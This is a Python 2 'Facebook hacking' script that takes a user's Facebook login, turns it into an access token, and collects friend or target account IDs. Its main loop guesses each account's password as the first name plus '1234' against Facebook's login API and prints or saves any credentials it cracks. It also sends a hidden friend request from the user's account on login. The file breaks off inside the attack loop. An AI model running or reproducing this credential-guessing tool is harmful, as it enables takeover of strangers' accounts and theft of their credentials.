#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To BabarAli
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2020


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in b:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    x = b
    for i in w:
        j = w.index(i)
        x = x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.01)
def tokenz():
	os.system('clear')
	print logo
	toket = raw_input("\033[1;97m[+] \033[1;97mToken \033[1;97m:")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		menu()
	except KeyError:
		print "\033[1;91m[!] Wrong"
		e = raw_input("\033[1;91m[?] \033[1;92mWant to pick up token?\033[1;97m[y/n]: ")
		if e =="":
			keluar()
		elif e =="y":
			login()
		else:
			keluar()

def get(data):
	print '[*] Generate access token '

	try:
		os.mkdir('cookie')
	except OSError:
		pass

	b = open('cookie/token.log','w')
	try:
		r = requests.get('https://api.facebook.com/restserver.php',params=data)
		a = json.loads(r.text)

		b.write(a['access_token'])
		b.close()
		print '[*] successfully generate access token'
		print '[*] Your access token is stored in cookie/token.log'
		menu()
	except KeyError:
		print '[!] Failed to generate access token'
		print '[!] Check your connection / email or password'
		os.remove('cookie/token.log')
		menu()
	except requests.exceptions.ConnectionError:
		print '[!] Failed to generate access token'
		print '[!] Connection error !!!'
		os.remove('cookie/token.log')
		menu()

def phone():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')

#Dev:Babar_Ali
##### BEAUTIFUL LOGO #####
logo = """
\033[1;96m╔══════════════════════════════════════════════════════════════╗
\033[1;96m║                                                              ║
\033[1;96m║  \033[1;92m██████╗  █████╗ ██╗  ██╗    █████╗ ███╗   ██╗ ██████╗ ███╗   ██╗\033[1;96m  ║
\033[1;96m║  \033[1;92m██╔══██╗██╔══██╗██║ ██╔╝   ██╔══██╗████╗  ██║██╔═══██╗████╗  ██║\033[1;96m  ║
\033[1;96m║  \033[1;92m██████╔╝███████║█████╔╝    ███████║██╔██╗ ██║██║   ██║██╔██╗ ██║\033[1;96m  ║
\033[1;96m║  \033[1;92m██╔═══╝ ██╔══██║██╔═██╗    ██╔══██║██║╚██╗██║██║   ██║██║╚██╗██║\033[1;96m  ║
\033[1;96m║  \033[1;92m██║     ██║  ██║██║  ██╗   ██║  ██║██║ ╚████║╚██████╔╝██║ ╚████║\033[1;96m  ║
\033[1;96m║  \033[1;92m╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═══╝\033[1;96m  ║
\033[1;96m║                                                              ║
\033[1;96m║               \033[1;93m🔥 FACEBOOK LOGIN TOOL 🔥\033[1;96m                  ║
\033[1;96m║            \033[1;95mThis Tool is Only for Pakistani FB Accounts\033[1;96m       ║
\033[1;96m║                                                              ║
\033[1;96m╠══════════════════════════════════════════════════════════════╣
\033[1;96m║                                                              ║
\033[1;96m║           \033[1;97m⚡ Author Name: \033[1;91mBabar Ali\033[1;97m     ⚡\033[1;96m             ║
\033[1;96m║           \033[1;97m⚡ Phone Number: \033[1;91m+923000223253\033[1;97m ⚡\033[1;96m             ║
\033[1;96m║           \033[1;97m⚡ YouTube Channel: \033[1;91mPak Anonymous\033[1;97m ⚡\033[1;96m          ║
\033[1;96m║           \033[1;97m⚡ From: \033[1;91mPakistan\033[1;97m      ⚡\033[1;96m                   ║
\033[1;96m║                                                              ║
\033[1;96m╚══════════════════════════════════════════════════════════════╝
"""

def tik():
	print "\033[1;96m╔════════════════════════════════════════╗"
	print "\033[1;96m║        \033[1;93m🔄 AUTHENTICATING... 🔄\033[1;96m        ║"
	print "\033[1;96m╚════════════════════════════════════════╝"
	titik = ['\033[1;92m●\033[1;93m○○ ','○\033[1;92m●\033[1;93m○ ','○○\033[1;92m● ']
	for i in range(3):
		for o in titik:
			print("\r\033[1;96m[\033[1;93m"+o+"\033[1;96m] \033[1;97mConnecting to Facebook servers..."),;sys.stdout.flush();time.sleep(0.3)
	print("\r\033[1;92m[●●●] \033[1;97mConnection established!                    ")
	time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print """
\033[1;96m╔══════════════════════════════════════════════════════════════╗
\033[1;96m║                                                              ║
\033[1;96m║    \033[1;92m██╗  ██╗ █████╗ ██╗     ██╗    ██╗     ██╗███╗   ██╗██╗   ██╗██╗  ██╗\033[1;96m    ║
\033[1;96m║    \033[1;92m██║ ██╔╝██╔══██╗██║     ██║    ██║     ██║████╗  ██║██║   ██║╚██╗██╔╝\033[1;96m    ║
\033[1;96m║    \033[1;92m█████╔╝ ███████║██║     ██║    ██║     ██║██╔██╗ ██║██║   ██║ ╚███╔╝\033[1;96m     ║
\033[1;96m║    \033[1;92m██╔═██╗ ██╔══██║██║     ██║    ██║     ██║██║╚██╗██║██║   ██║ ██╔██╗\033[1;96m     ║
\033[1;96m║    \033[1;92m██║  ██╗██║  ██║███████╗██║    ███████╗██║██║ ╚████║╚██████╔╝██╔╝ ██╗\033[1;96m    ║
\033[1;96m║    \033[1;92m╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝    ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝\033[1;96m    ║
\033[1;96m║                                                              ║
\033[1;96m║                    \033[1;93m🔐 SECURE LOGIN SYSTEM 🔐\033[1;96m                 ║
\033[1;96m║                                                              ║
\033[1;96m╠══════════════════════════════════════════════════════════════╣
\033[1;96m║                                                              ║
\033[1;96m║  \033[1;93m🌟 Welcome Sir/Mam! Please enter your tool credentials 🌟\033[1;96m  ║
\033[1;96m║                                                              ║
\033[1;96m║  \033[1;97m📝 Enter Tool Username and Password to Continue\033[1;96m           ║
\033[1;96m║                                                              ║
\033[1;96m╚══════════════════════════════════════════════════════════════╝
 """
CorrectUsername = "1"
CorrectPassword = "2"

loop = 'true'
while (loop == 'true'):
    print "\033[1;96m╔════════════════════════════════════════╗"
    print "\033[1;96m║          \033[1;93m🔑 TOOL ACCESS 🔑\033[1;96m           ║"
    print "\033[1;96m╚════════════════════════════════════════╝"
    print ""
    username = raw_input("\033[1;96m[\033[1;93m🔸\033[1;96m] \033[1;97mTool Username\033[1;96m: \033[1;92m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;96m[\033[1;93m🔸\033[1;96m] \033[1;97mTool Password\033[1;96m: \033[1;92m")
        if (password == CorrectPassword):
            print "\033[1;96m╔════════════════════════════════════════╗"
            print "\033[1;96m║         \033[1;92m✅ LOGIN SUCCESSFUL! ✅\033[1;96m         ║"
            print "\033[1;96m║       \033[1;97mWelcome " + username + "! Access Granted\033[1;96m        ║"
            print "\033[1;96m╚════════════════════════════════════════╝"
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;96m╔════════════════════════════════════════╗"
            print "\033[1;96m║           \033[1;91m❌ WRONG PASSWORD ❌\033[1;96m          ║"
            print "\033[1;96m║        \033[1;93mPlease try again...\033[1;96m             ║"
            print "\033[1;96m╚════════════════════════════════════════╝"
            time.sleep(2)
            os.system('clear')
            print logo
    else:
        print "\033[1;96m╔════════════════════════════════════════╗"
        print "\033[1;96m║           \033[1;91m❌ WRONG USERNAME ❌\033[1;96m          ║"
        print "\033[1;96m║        \033[1;93mPlease try again...\033[1;96m             ║"
        print "\033[1;96m╚════════════════════════════════════════╝"
        time.sleep(2)
        os.system('clear')
        print logo

##### LICENSE #####
#=================#
def lisensi():
	os.system('clear')
	login()
####login#########
def login():
	os.system('clear')
	print logo
	print ""
	print "\033[1;96m╔════════════════════════════════════════╗"
	print "\033[1;96m║            \033[1;93m🚀 MAIN MENU 🚀\033[1;96m            ║"
	print "\033[1;96m╚════════════════════════════════════════╝"
	print ""
	print "\033[1;96m[\033[1;92m1\033[1;96m] \033[1;97m🔐 Login With Facebook Account"
        time.sleep(0.05)
        print "\033[1;96m[\033[1;92m2\033[1;96m] \033[1;97m🎫 Login With Token"
        time.sleep(0.05)
        print "\033[1;96m[\033[1;92m3\033[1;96m] \033[1;97m📱 Download Token App"
        time.sleep(0.05)
	print "\033[1;96m[\033[1;91m0\033[1;96m] \033[1;97m🚪 Exit"
	print ""
	print "\033[1;96m╔════════════════════════════════════════╗"
	print "\033[1;96m║        \033[1;93mSelect Your Option Below\033[1;96m        ║"
	print "\033[1;96m╚════════════════════════════════════════╝"
	pilih_login()

def pilih_login():
	peak = raw_input("\n\033[1;96m[\033[1;93m🔸\033[1;96m] \033[1;97mChoose an Option\033[1;96m: \033[1;95m")
	if peak =="":
		print "\033[1;96m╔════════════════════════════════════════╗"
		print "\033[1;96m║          \033[1;91m⚠️  INVALID INPUT ⚠️\033[1;96m           ║"
		print "\033[1;96m║       \033[1;93mPlease enter a valid option\033[1;96m       ║"
		print "\033[1;96m╚════════════════════════════════════════╝"
		time.sleep(1)
		login()
	elif peak =="1":
		login1()
        elif peak =="2":
	        tokenz()
        elif peak =="3":
	        print "\033[1;96m╔════════════════════════════════════════╗"
	        print "\033[1;96m║       \033[1;93m📱 Opening Token App... 📱\033[1;96m       ║"
	        print "\033[1;96m╚════════════════════════════════════════╝"
	        time.sleep(1)
	        os.system('xdg-open https://m.apkpure.com/get-access-token/com.proit.thaison.getaccesstokenfacebook/download/1-APK?from=versions%2Fversion')
	        login()
	elif peak =="0":
		print "\033[1;96m╔════════════════════════════════════════╗"
		print "\033[1;96m║            \033[1;93m👋 GOODBYE! 👋\033[1;96m             ║"
		print "\033[1;96m║        \033[1;97mThank you for using!\033[1;96m          ║"
		print "\033[1;96m╚════════════════════════════════════════╝"
		time.sleep(1)
		keluar()
        else:
		print "\033[1;96m╔════════════════════════════════════════╗"
		print "\033[1;96m║          \033[1;91m❌ WRONG INPUT ❌\033[1;96m           ║"
		print "\033[1;96m║       \033[1;93mPlease enter 1, 2, 3, or 0\033[1;96m      ║"
		print "\033[1;96m╚════════════════════════════════════════╝"
		time.sleep(2)
		login()

def login1():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		time.sleep(0.05)
		print logo
		print ""
		print "\033[1;96m╔════════════════════════════════════════════════════════════╗"
		print "\033[1;96m║                    \033[1;91m⚠️  IMPORTANT WARNINGS ⚠️\033[1;96m                  ║"
		print "\033[1;96m╠════════════════════════════════════════════════════════════╣"
		jalan('\033[1;96m║ \033[1;91m🔸 Warning:\033[1;92m Do Not Use Your Personal Account\033[1;96m         ║' )
		jalan('\033[1;96m║ \033[1;91m🔸 Warning:\033[1;92m Use a New Account To Login\033[1;96m               ║' )
		jalan('\033[1;96m║ \033[1;91m🔸 Warning:\033[1;92m Termux All Version Work\033[1;96m                 ║' )
		jalan('\033[1;96m║ \033[1;91m🔸 Warning:\033[1;92m Your Internet Should Be Fast\033[1;96m            ║' )
		print "\033[1;96m╚════════════════════════════════════════════════════════════╝"
		print ""
		
		print "\033[1;96m╔════════════════════════════════════════════════════════════╗"
		print "\033[1;96m║              \033[1;93m🔐 FACEBOOK LOGIN PORTAL 🔐\033[1;96m              ║"
		print "\033[1;96m╚════════════════════════════════════════════════════════════╝"
		print ""
		id = raw_input('\033[1;96m[\033[1;93m📧\033[1;96m] \033[1;97mFacebook/Email\033[1;96m: \033[1;93m')
		pwd = raw_input('\033[1;96m[\033[1;93m🔒\033[1;96m] \033[1;97mPassword\033[1;96m: \033[1;92m')
		tik()
		try:
			br.open('https://mbasic.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[1;97mThere is no internet connection"
			keluar()
		except Exception as e:
			print"\n\x1b[1;97mConnection error: " + str(e)
			keluar()
		
		try:
			br._factory.is_html = True
			# Try to find and select the login form
			forms = list(br.forms())
			if len(forms) == 0:
				print"\n\x1b[1;97mNo login form found"
				keluar()
			
			br.select_form(nr=0)
			
			# Check if form has the required fields
			try:
				br.form['email'] = id
				br.form['pass'] = pwd
			except Exception:
				print"\n\x1b[1;97mLogin form fields not found"
				keluar()
			
			br.submit()
			url = br.geturl()
			
			if 'save-device' in url or 'home.php' in url or 'welcome' in url:
				try:
					# Use newer API method
					sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
					data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
					x=hashlib.new("md5")
					x.update(sig)
					a=x.hexdigest()
					data.update({'sig':a})
					
					# Try multiple API endpoints
					api_urls = [
						"https://b-api.facebook.com/method/auth.login",
						"https://api.facebook.com/restserver.php",
						"https://graph.facebook.com/oauth/access_token"
					]
					
					z = None
					for api_url in api_urls:
						try:
							r=requests.get(api_url,params=data, timeout=30)
							z=json.loads(r.text)
							if 'access_token' in z:
								break
						except:
							continue
					if z and 'access_token' in z:
						unikers = open("login.txt", 'w')
						unikers.write(z['access_token'])
						unikers.close()
						print ""
						print "\033[1;96m╔════════════════════════════════════════════════════════════╗"
						print "\033[1;96m║                  \033[1;92m🎉 LOGIN SUCCESSFUL! 🎉\033[1;96m                  ║"
						print "\033[1;96m║              \033[1;97mYour account has been verified!\033[1;96m             ║"
						print "\033[1;96m║               \033[1;93mRedirecting to main menu...\033[1;96m               ║"
						print "\033[1;96m╚════════════════════════════════════════════════════════════╝"
						time.sleep(2)
						os.system('xdg-open https://youtube.com/channel/UCWLIAZHMlnlQMuMKTjBdbAQ')
						try:
							requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
						except:
							pass
						menu()
					else:
						print ""
						print "\033[1;96m╔════════════════════════════════════════════════════════════╗"
						print "\033[1;96m║                   \033[1;91m❌ LOGIN FAILED ❌\033[1;96m                    ║"
						print "\033[1;96m║              \033[1;93mFailed to get access token\033[1;96m                ║"
						print "\033[1;96m║               \033[1;97mPlease try again...\033[1;96m                     ║"
						print "\033[1;96m╚════════════════════════════════════════════════════════════╝"
						time.sleep(2)
						login()
				except requests.exceptions.ConnectionError:
					print"\n\x1b[1;97mThere is no internet connection"
					keluar()
				except Exception as e:
					print"\n\x1b[1;97mAPI Error: " + str(e)
					keluar()
			elif 'checkpoint' in url:
				print ""
				print "\033[1;96m╔════════════════════════════════════════════════════════════╗"
				print "\033[1;96m║                 \033[1;93m🔐 CHECKPOINT DETECTED 🔐\033[1;96m                ║"
				print "\033[1;96m║            \033[1;97mYour Account requires verification\033[1;96m           ║"
				print "\033[1;96m║              \033[1;91mPlease check your Facebook app\033[1;96m             ║"
				print "\033[1;96m╚════════════════════════════════════════════════════════════╝"
				os.system('rm -rf login.txt')
				time.sleep(3)
				keluar()
			else:
				print ""
				print "\033[1;96m╔════════════════════════════════════════════════════════════╗"
				print "\033[1;96m║                 \033[1;91m❌ INCORRECT CREDENTIALS ❌\033[1;96m               ║"
				print "\033[1;96m║              \033[1;93mPassword/Email is incorrect\033[1;96m                ║"
				print "\033[1;96m║                \033[1;97mPlease try again...\033[1;96m                     ║"
				print "\033[1;96m╚════════════════════════════════════════════════════════════╝"
				os.system('rm -rf login.txt')
				time.sleep(2)
				login()
		except Exception as e:
			print ""
			print "\033[1;96m╔════════════════════════════════════════════════════════════╗"
			print "\033[1;96m║                   \033[1;91m⚠️  LOGIN ERROR ⚠️\033[1;96m                     ║"
			print "\033[1;96m║             \033[1;93mConnection issue or wrong credentials\033[1;96m        ║"
			print "\033[1;96m║                \033[1;97mError: " + str(e)[:30] + "\033[1;96m                     ║"
			print "\033[1;96m╚════════════════════════════════════════════════════════════╝"
			time.sleep(2)
			login()
			
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		o = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(o.text)
		nama = a['name']
		id = a['id']
                t = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
                b = json.loads(t.text)
                sub = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print"\033[1;97mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;94mThere is no internet connection"
		keluar()
	os.system("clear") #Dev:Babar_Ali
	print logo
	print ""
	print "\033[1;96m╔════════════════════════════════════════════════════════════╗"
	print "\033[1;96m║                 \033[1;92m👤 LOGGED IN USER INFO 👤\033[1;96m                 ║"
	print "\033[1;96m╠════════════════════════════════════════════════════════════╣"
	print "\033[1;96m║  \033[1;97m📝 Name: \033[1;91m" + nama + "\033[1;96m"
	print "\033[1;96m║  \033[1;97m🆔 ID: \033[1;91m" + id + "\033[1;96m"
	print "\033[1;96m╚════════════════════════════════════════════════════════════╝"
	print ""
	print "\033[1;96m╔════════════════════════════════════════════════════════════╗"
	print "\033[1;96m║                    \033[1;93m🎯 MAIN MENU 🎯\033[1;96m                     ║"
	print "\033[1;96m╚════════════════════════════════════════════════════════════╝"
	print ""
	print "\033[1;96m[\033[1;92m1\033[1;96m] \033[1;97m🚀 Start Hacking"
	print "\033[1;96m[\033[1;92m2\033[1;96m] \033[1;97m🔍 ID Not Found Problem"
	print "\033[1;96m[\033[1;92m3\033[1;96m] \033[1;97m💬 Join Pak Anonymous WhatsApp Group"
	print "\033[1;96m[\033[1;92m4\033[1;96m] \033[1;97m📱 Contact Pak Anonymous Owner on Facebook"
	print "\033[1;96m[\033[1;92m5\033[1;96m] \033[1;97m📺 Subscribe Pak Anonymous YouTube Channel" 
	print "\033[1;96m[\033[1;91m0\033[1;96m] \033[1;97m🚪 Exit"
	print ""
	print "\033[1;96m╔════════════════════════════════════════╗"
	print "\033[1;96m║      \033[1;93mSelect Your Option Below\033[1;96m       ║"
	print "\033[1;96m╚════════════════════════════════════════╝"
	pilih()


def pilih():
	unikers = raw_input("\n\033[1;96m[\033[1;93m🔸\033[1;96m] \033[1;97mChoose an Option\033[1;96m: \033[1;95m")
	if unikers =="":
		print "\033[1;96m╔════════════════════════════════════════╗"
		print "\033[1;96m║          \033[1;91m⚠️  INVALID INPUT ⚠️\033[1;96m           ║"
		print "\033[1;96m║       \033[1;93mPlease enter a valid option\033[1;96m       ║"
		print "\033[1;96m╚════════════════════════════════════════╝"
		time.sleep(1)
		menu()
        elif unikers =="1":		
	        super()
	elif unikers =="2":
		print "\033[1;96m╔════════════════════════════════════════╗"
		print "\033[1;96m║        \033[1;93m🔍 Opening ID Finder... 🔍\033[1;96m       ║"
		print "\033[1;96m╚════════════════════════════════════════╝"
		time.sleep(1)
		os.system('xdg-open https://commentpicker.com/find-facebook-id.php')
	        menu()
	elif unikers =="3":
		print "\033[1;96m╔════════════════════════════════════════╗"
		print "\033[1;96m║       \033[1;93m💬 Opening WhatsApp... 💬\033[1;96m        ║"
		print "\033[1;96m╚════════════════════════════════════════╝"
		time.sleep(1)
		os.system('xdg-open https://chat.whatsapp.com/FlzjJ1wklTo3EvKtkSfwRZ')
	        menu()
        elif unikers =="4":
		print "\033[1;96m╔════════════════════════════════════════╗"
		print "\033[1;96m║       \033[1;93m📱 Opening Facebook... 📱\033[1;96m        ║"
		print "\033[1;96m╚════════════════════════════════════════╝"
		time.sleep(1)
		os.system('xdg-open https://facebook.com/Babar.ali7500')
	        menu()
	elif unikers =="5":
		print "\033[1;96m╔════════════════════════════════════════╗"
		print "\033[1;96m║        \033[1;93m📺 Opening YouTube... 📺\033[1;96m        ║"
		print "\033[1;96m╚════════════════════════════════════════╝"
		time.sleep(1)
		os.system('xdg-open https://m.youtube.com/channel/UCWLIAZHMlnlQMuMKTjBdbAQ')
	        menu()		
	elif unikers =="0":
		print "\033[1;96m╔════════════════════════════════════════╗"
		print "\033[1;96m║         \033[1;93m🔄 Logging Out... 🔄\033[1;96m          ║"
		print "\033[1;96m║        \033[1;97mToken Removed Successfully\033[1;96m       ║"
		print "\033[1;96m╚════════════════════════════════════════╝"
		time.sleep(1)
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\033[1;96m╔════════════════════════════════════════╗"
		print "\033[1;96m║          \033[1;91m❌ WRONG INPUT ❌\033[1;96m           ║"
		print "\033[1;96m║       \033[1;93mPlease enter 1, 2, 3, 4, 5, or 0\033[1;96m ║"
		print "\033[1;96m╚════════════════════════════════════════╝"
		time.sleep(2)
		menu()



def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print "\033[1;96m╔════════════════════════════════════════╗"
		print "\033[1;96m║          \033[1;91m❌ TOKEN INVALID ❌\033[1;96m           ║"
		print "\033[1;96m║        \033[1;93mPlease login again...\033[1;96m         ║"
		print "\033[1;96m╚════════════════════════════════════════╝"
		os.system('rm -rf login.txt')
		time.sleep(2)
		login()
	os.system('clear')
	print logo
	print ""
	print "\033[1;96m╔════════════════════════════════════════════════════════════╗"
	print "\033[1;96m║                   \033[1;93m⚡ HACKING MENU ⚡\033[1;96m                    ║"
	print "\033[1;96m╚════════════════════════════════════════════════════════════╝"
	print ""
	print "\033[1;96m[\033[1;92m1\033[1;96m] \033[1;97m👥 Hack From Friend List"
	print "\033[1;96m[\033[1;92m2\033[1;96m] \033[1;97m🌍 Hack From Public Accounts"
	print "\033[1;96m[\033[1;91m0\033[1;96m] \033[1;97m🔙 Back to Main Menu"
	print ""
	print "\033[1;96m╔════════════════════════════════════════╗"
	print "\033[1;96m║      \033[1;93mSelect Your Target Method\033[1;96m       ║"
	print "\033[1;96m╚════════════════════════════════════════╝"
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;96m[\033[1;93m🔸\033[1;96m] \033[1;97mChoose an Option\033[1;96m: \033[1;95m")
	if peak =="":
		print "\033[1;96m╔════════════════════════════════════════╗"
		print "\033[1;96m║          \033[1;91m⚠️  INVALID INPUT ⚠️\033[1;96m           ║"
		print "\033[1;96m║       \033[1;93mPlease enter a valid option\033[1;96m       ║"
		print "\033[1;96m╚════════════════════════════════════════╝"
		time.sleep(1)
		super()
	elif peak =="1":
		os.system('clear')
		print "\033[1;96m╔════════════════════════════════════════════════════════════╗"
		print "\033[1;96m║                \033[1;93m👥 FRIEND LIST HACKING 👥\033[1;96m                ║"
		print "\033[1;96m╚════════════════════════════════════════════════════════════╝"
		print logo
		print ""
		print "\033[1;96m╔════════════════════════════════════════╗"
		print "\033[1;96m║       \033[1;93m🔄 Getting Friend List... 🔄\033[1;96m      ║"
		print "\033[1;96m╚════════════════════════════════════════╝"
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print "\033[1;96m╔════════════════════════════════════════════════════════════╗"
		print "\033[1;96m║               \033[1;93m🌍 PUBLIC ACCOUNT HACKING 🌍\033[1;96m               ║"
		print "\033[1;96m╚════════════════════════════════════════════════════════════╝"
		print logo
		print ""
		idt = raw_input("\033[1;96m[\033[1;93m🆔\033[1;96m] \033[1;97mEnter Target ID\033[1;96m: \033[1;93m")
		try:
			print "\033[1;96m╔════════════════════════════════════════╗"
			print "\033[1;96m║        \033[1;93m🔍 Validating ID... 🔍\033[1;96m         ║"
			print "\033[1;96m╚════════════════════════════════════════╝"
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print ""
			print "\033[1;96m╔════════════════════════════════════════╗"
			print "\033[1;96m║         \033[1;92m✅ ID FOUND! ✅\033[1;96m             ║"
			print "\033[1;96m║  \033[1;97mName: \033[1;91m" + op["name"] + "\033[1;96m"
			print "\033[1;96m╚════════════════════════════════════════╝"
		except KeyError:
			print ""
			print "\033[1;96m╔════════════════════════════════════════╗"
			print "\033[1;96m║           \033[1;91m❌ ID NOT FOUND ❌\033[1;96m          ║"
			print "\033[1;96m║        \033[1;93mPlease check the ID again\033[1;96m      ║"
			print "\033[1;96m╚════════════════════════════════════════╝"
			raw_input("\n\033[1;96m[\033[1;97mPress Enter to go back\033[1;96m]")
			super()
		print ""
		print "\033[1;96m╔════════════════════════════════════════╗"
		print "\033[1;96m║      \033[1;93m🔄 Getting Friend List... 🔄\033[1;96m      ║"
		print "\033[1;96m╚════════════════════════════════════════╝"
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\033[1;96m╔════════════════════════════════════════╗"
		print "\033[1;96m║          \033[1;91m❌ WRONG INPUT ❌\033[1;96m           ║"
		print "\033[1;96m║       \033[1;93mPlease enter 1, 2, or 0\033[1;96m        ║"
		print "\033[1;96m╚════════════════════════════════════════╝"
		time.sleep(1)
		super()
	
	print ""
	print "\033[1;96m╔════════════════════════════════════════════════════════════╗"
	print "\033[1;96m║               \033[1;92m📊 ACCOUNT STATISTICS 📊\033[1;96m                ║"
	print "\033[1;96m║  \033[1;97mTotal Accounts Found: \033[1;91m" + str(len(id)) + "\033[1;96m"
	print "\033[1;96m╚════════════════════════════════════════════════════════════╝"
	print ""
	print "\033[1;96m╔════════════════════════════════════════╗"
	print "\033[1;96m║        \033[1;93m🚀 STARTING ATTACK... 🚀\033[1;96m        ║"
	print "\033[1;96m╚════════════════════════════════════════╝"
	
	titik = ['\033[1;92m●\033[1;93m○○ ','○\033[1;92m●\033[1;93m○ ','○○\033[1;92m● ']
	for i in range(2):
		for o in titik:
			print("\r\033[1;96m[\033[1;93m"+o+"\033[1;96m] \033[1;93mCloning process started...\033[1;97m"),;sys.stdout.flush();time.sleep(0.2)
	print("\r\033[1;92m[●●●] \033[1;97mAttack initiated successfully!                    ")
	print ""
	print "\033[1;96m╔════════════════════════════════════════════════════════════╗"
	print "\033[1;96m║  \033[1;93m📝 NOTE: \033[1;97mPress CTRL+Z to stop the process anytime\033[1;96m      ║"
	print "\033[1;96m╚════════════════════════════════════════════════════════════╝"
	print ""
	print "\033[1;96m╔════════════════════════════════════════════════════════════╗"
	print "\033[1;96m║                   \033[1;93m🎯 ATTACK RESULTS 🎯\033[1;96m                   ║"
	print "\033[1;96m╚════════════════════════════════════════════════════════════╝"
 	
			
	def main(arg):
		global oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:love_hacker
		try:													
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
			b = json.loads(a.text)												
			pass1 = b['first_name'] + '1234'												
			try:
				data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
				q = json.load(data)
			except:
				# Fallback method if urllib fails
				try:
					api_data = {
						"access_token": "237759909591655%257C0f140aabedfb65ac27a739ed1a2263b1",
						"format": "json",
						"sdk_version": "2",
						"email": user,
						"locale": "en_US", 
						"password": pass1,
						"sdk": "ios",
						"generate_session_cookies": "1",
						"sig": "3f555f99fb61fcd7aa0c44f58f522ef6"
					}
					r = requests.get("https://b-api.facebook.com/method/auth.login", params=api_data, timeout=30)
					q = json.loads(r.text)
				except:
					q = {"error": "API connection failed"}												
			if 'access_token' in q:
				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				z = json.loads(x.text)
				print '\033[1;96m[\033[1;92m  ✅  \033[1;96m] \033[1;92m[SUCCESS]'											
				print '\033[1;96m[🎯] \033[1;97mName\033[1;96m     : \033[1;91m' + b['name']											
				print '\033[1;96m[🎯] \033[1;97mID\033[1;96m       : \033[1;91m' + user											
				print '\033[1;96m[🎯] \033[1;97mPassword\033[1;96m : \033[1;91m' + pass1 + '\n'											
				oks.append(user+pass1)
                        else:
			        if 'www.facebook.com' in q["error_msg"]:
				    print '\033[1;96m[\033[1;93m  🔐  \033[1;96m] \033[1;93m[CHECKPOINT]'
				    print '\033[1;96m[🔒] \033[1;97mName\033[1;96m     : \033[1;93m' + b ['name']
				    print '\033[1;96m[🔒] \033[1;97mID\033[1;96m       : \033[1;93m' + user
				    print '\033[1;96m[🔒] \033[1;97mPassword\033[1;96m : \033[1;93m' + pass1 + '\n'
				    cek = open("out/super_cp.txt", "a")
				    cek.write("ID:" +user+ " Pw:" +pass1+"\n")
				    cek.close()
